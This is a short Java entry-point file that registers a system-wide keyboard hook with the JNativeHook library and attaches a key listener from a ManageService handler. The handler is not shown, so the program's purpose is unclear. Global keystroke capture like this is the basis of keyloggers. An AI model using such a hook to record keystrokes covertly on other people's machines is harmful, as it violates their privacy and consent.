package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import handlers.ManageService;


public class main {
	

	public static void main(String[] args) {
		
		ManageService service = new ManageService();
		// TODO Auto-generated method stub
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());
	}

}
